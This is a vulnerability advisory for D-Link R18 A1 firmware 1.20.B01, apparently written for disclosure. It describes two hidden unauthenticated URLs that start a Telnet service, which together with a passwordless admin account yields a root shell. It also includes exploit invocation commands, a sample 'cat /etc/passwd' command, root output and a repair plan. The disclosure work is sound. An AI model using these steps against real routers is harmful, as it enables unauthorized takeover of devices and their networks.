# D-Link R18 A1 Hidden Factory URLs Enable Unauthenticated Telnet Root Access

## Title

D-Link R18 A1 1.20.B01 Hidden Factory URLs Enable Unauthenticated Telnet and Root Remote Code Execution

## Description

### 1. Vulnerability Name

Unauthenticated hidden factory functionality in `httpd` enables a Telnet service bound to all interfaces and, under the default configuration, provides a UID 0 shell through the passwordless `admin` account.

### 2. Vulnerability Contributor and Submitter

- **Researcher**: Lumina
- **Contact**: 1547800591@qq.com

### 3. Vendor and Product Information

- **Vendor**: D-Link Corporation
- **Vendor homepage**: https://www.dlink.com/
- **Product**: D-Link R18 A1 Router Operating System
- **Component**: Web management backend, `/bin/httpd`
- **Vulnerable function**: `handleIncoming`
- **Affected URLs**: `/283d9` and `/tj6hji4`

![image-20261105190640156](R18A1-FW120B01-Hidden-URL-Telnet-Root-RCE.EN.assets/image-20261105190640156.png)

### 4. Affected Version

- **Firmware**: `1.20.B01` (`R18A1_FW120B01.bin`)
- **Runtime version string**: `1.20.01`
- **Firmware SHA-256**: `3d6eba2059034d4148543acb7894c81633ce406756287eba2573d323a785a01d`
- **Decrypted firmware SHA-256**: `11cfca751130b979bad3d00cb8b442bd91fd54c134b290070fed6b195a38db24`
- **`httpd` SHA-256**: `a73f1bf1a4cb8bc86d7b2e34a50dcb54dce559a001455b4f6942294b72f43cc3`
- **Architecture**: MIPS32 little-endian, uClibc, Linux 3.18.21

### 5. Vulnerability Class and Attack Conditions

- **Vulnerability class**: Hidden functionality and missing authentication
- **CWE**: CWE-912 (Hidden Functionality); CWE-306 (Missing Authentication for Critical Function)
- **Attack vector**: Adjacent network by default, or remote networks if the management interface is exposed
- **Authentication required**: No
- **User interaction required**: No
- **Privileges gained**: Root (`uid=0`) under the default credential configuration

### 6. Severity

An unauthenticated attacker with access to the Web management port can enable Telnet on every interface. In the default configuration, the attacker can immediately log in as `admin` without a password and execute arbitrary commands as root, resulting in complete device compromise.

### 7. Vulnerability Description

The HTTP request dispatcher contains an undocumented two-step factory-debug state machine. A request to `/283d9` sets the global `enable_dbg_flag` to `1`. A subsequent request to `/tj6hji4` then passes a fixed command to `_exec_cmd`:

```text
killall -9 telnetd; telnetd -b 0.0.0.0 -p 23
```

Neither request requires a cookie, HNAP login, API authentication, or any other authorization check. The expected HTTP response can be `404`; the state change and command execution occur despite that response.

### 8. Technical Details and Root Cause

#### Request-driven state transition

`handleIncoming` compares the request path with `/283d9` and sets `enable_dbg_flag`. When the next path is `/tj6hji4` and the flag is `1`, execution reaches the Telnet command branch.

Relevant instructions in the non-PIE MIPS binary include:

- `0x40c944`: load the fixed Telnet command string.
- `0x40c94c`: resolve `_exec_cmd`.
- `0x40c964`: execute the indirect call through `$t9`.

The command is hardcoded and does not come from the HTTP body. The vulnerability is the unauthorized exposure of this hidden state machine, not shell metacharacter injection.

#### Default account impact

The emulated default account database contains an active `admin` UID 0 account. Telnet login with `admin` proceeds directly to a shell without a password prompt. Devices with independently configured Telnet credentials may require those credentials for interactive login, but the unauthorized command execution that starts Telnet remains present.

### 9. Proof of Concept

The self-contained Python 3 exploit uses only the standard library. Its default arguments match the authorized emulation forwarding configuration:

```bash
python3 ./r18_f1_hidden_telnet_rce.py
```

The default target is `192.168.135.137`, with Web forwarding on port `18080` and Telnet forwarding on port `18023`. For direct access from inside the emulation VM, use:

```bash
python3 ./r18_f1_hidden_telnet_rce.py \
  --host 192.168.0.1 --web-port 80 --telnet-port 23
```

A custom command can be supplied; the exploit appends `; id` to verify privileges:

```bash
python3 ./r18_f1_hidden_telnet_rce.py --command "cat /etc/passwd"
```

Observed result from the final host-side test:

```text
[*] GET /283d9: HTTP 404
[*] GET /tj6hji4: HTTP 404
R18_F1_RCE_OK
uid=0(root) gid=0(root) groups=0(root)
[+] F1 succeeded: unauthenticated hidden function produced a UID 0 shell
```

![image-20261105191248952](R18A1-FW120B01-Hidden-URL-Telnet-Root-RCE.EN.assets/image-20261105191248952.png)

### 10. Impact

Successful exploitation permits unauthorized administrative command execution. An attacker can read or alter configuration, change routing and wireless settings, install persistent modifications, interrupt availability, or attack connected LAN clients. Binding Telnet to `0.0.0.0` also increases exposure beyond the original HTTP entry point.

### 11. Repair Plan

1. Remove `/283d9`, `/tj6hji4`, `enable_dbg_flag`, and all factory-debug command branches from production builds.
2. Prohibit HTTP handlers from starting Telnet or equivalent general-purpose debugging services.
3. Eliminate blank and shared default passwords; require a unique credential during initial provisioning.
4. Add release tests that enumerate and reject hidden debug URLs and verify that Telnet is not listening by default.
5. Until a fix is available, restrict management access to trusted networks and disable remote management.

### 12. Verification and Disclosure Notes

- **Evidence level**: VALIDATED through end-to-end testing in full-system FirmAE/QEMU emulation.
- The Web frontend under `/tmp/www3`, original `httpd`, `commander`, and `csmanuds` were running.
- The vulnerable `httpd` path was not patched. Only CPU-startup and bootloader-check adaptations were used to keep the emulation running.
- Forwarding ports `18080` and `18023` replaced target ports `80` and `23` solely to permit access from the host.

The following supporting file is attached:

- `exploits/r18_f1_hidden_telnet_rce.py` — self-contained one-click Python 3 exploit and UID 0 verification.
